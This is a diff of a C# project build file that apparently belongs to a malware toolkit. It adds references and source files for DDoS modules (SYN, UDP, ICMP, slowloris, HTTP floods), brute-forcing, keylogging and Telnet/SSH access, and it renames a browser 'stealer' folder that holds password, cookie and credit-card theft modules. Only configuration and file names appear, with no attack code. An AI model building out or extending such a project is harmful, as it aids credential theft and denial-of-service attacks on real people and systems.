@@ -14,6 +14,8 @@
     <Deterministic>true</Deterministic>
     <NuGetPackageImportStamp>
     </NuGetPackageImportStamp>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <TargetFrameworkProfile />
     <PublishUrl>publish\</PublishUrl>
     <Install>true</Install>
     <InstallFrom>Disk</InstallFrom>
@@ -26,10 +28,8 @@
     <MapFileExtensions>true</MapFileExtensions>
     <ApplicationRevision>0</ApplicationRevision>
     <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
-    <IsWebBootstrapper>false</IsWebBootstrapper>
     <UseApplicationTrust>false</UseApplicationTrust>
     <BootstrapperEnabled>true</BootstrapperEnabled>
-    <TargetFrameworkProfile />
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -52,6 +52,18 @@
     <WarningLevel>4</WarningLevel>
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <PropertyGroup>
+    <TargetZone>Internet</TargetZone>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>false</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>Properties\app.manifest</ApplicationManifest>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="AudioSwitcher.AudioApi, Version=3.0.0.209, Culture=neutral, PublicKeyToken=fda5729e2db3a64f, processorArchitecture=MSIL">
       <HintPath>..\packages\AudioSwitcher.AudioApi.3.0.0\lib\net40\AudioSwitcher.AudioApi.dll</HintPath>
@@ -62,8 +74,11 @@
     <Reference Include="Newtonsoft.Json, Version=12.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
       <HintPath>..\packages\Newtonsoft.Json.12.0.3\lib\net45\Newtonsoft.Json.dll</HintPath>
     </Reference>
+    <Reference Include="Renci.SshNet, Version=2016.1.0.0, Culture=neutral, PublicKeyToken=1cee9f8bde3db106, processorArchitecture=MSIL">
+      <HintPath>..\packages\SSH.NET.2016.1.0\lib\net40\Renci.SshNet.dll</HintPath>
+    </Reference>
     <Reference Include="Sodium">
-      <HintPath>iModules\Sodium.dll</HintPath>
+      <HintPath>iModules\stealer\Sodium.dll</HintPath>
     </Reference>
     <Reference Include="System" />
     <Reference Include="System.ComponentModel.Composition" />
@@ -72,6 +87,7 @@
     <Reference Include="System.Drawing" />
     <Reference Include="System.IO.Compression.FileSystem" />
     <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.Security" />
     <Reference Include="System.Speech" />
     <Reference Include="System.Windows.Forms" />
@@ -87,25 +103,33 @@
     <Compile Include="iModules\admin.cs" />
     <Compile Include="iModules\audio.cs" />
     <Compile Include="iModules\autorun.cs" />
+    <Compile Include="iModules\bruteforce.cs" />
     <Compile Include="iModules\bypass.cs" />
     <Compile Include="iModules\core.cs" />
     <Compile Include="iModules\crypt.cs" />
+    <Compile Include="iModules\ddos\icmp.cs" />
+    <Compile Include="iModules\ddos\syn.cs" />
+    <Compile Include="iModules\ddos\udp.cs" />
+    <Compile Include="iModules\ddos\slowloris.cs" />
+    <Compile Include="iModules\ddos\http.cs" />
     <Compile Include="iModules\evil.cs" />
     <Compile Include="iModules\clipboard.cs" />
     <Compile Include="iModules\desktopScreenshot.cs" />
+    <Compile Include="iModules\keyboards.cs" />
     <Compile Include="iModules\monitor.cs" />
     <Compile Include="iModules\network.cs" />
     <Compile Include="iModules\power.cs" />
     <Compile Include="iModules\status.cs" />
-    <Compile Include="iModules\stealler\Bookmarks.cs" />
-    <Compile Include="iModules\stealler\Cookies.cs" />
-    <Compile Include="iModules\stealler\CreditCards.cs" />
-    <Compile Include="iModules\stealler\Crypt.cs" />
-    <Compile Include="iModules\stealler\DPAPI.cs" />
-    <Compile Include="iModules\stealler\History.cs" />
-    <Compile Include="iModules\stealler\Passwords.cs" />
-    <Compile Include="iModules\stealler\SQLite.cs" />
+    <Compile Include="iModules\stealer\Bookmarks.cs" />
+    <Compile Include="iModules\stealer\Cookies.cs" />
+    <Compile Include="iModules\stealer\CreditCards.cs" />
+    <Compile Include="iModules\stealer\Crypt.cs" />
+    <Compile Include="iModules\stealer\DPAPI.cs" />
+    <Compile Include="iModules\stealer\History.cs" />
+    <Compile Include="iModules\stealer\Passwords.cs" />
+    <Compile Include="iModules\stealer\SQLite.cs" />
     <Compile Include="iModules\taskmanager.cs" />
+    <Compile Include="iModules\TelnetInterface.cs" />
     <Compile Include="iModules\webcam.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -113,6 +137,7 @@
   <ItemGroup>
     <None Include="App.config" />
     <None Include="packages.config" />
+    <None Include="Properties\app.manifest" />
   </ItemGroup>
   <ItemGroup>
     <COMReference Include="IWshRuntimeLibrary">
@@ -140,5 +165,6 @@
   <ItemGroup>
     <WCFMetadata Include="Connected Services\" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
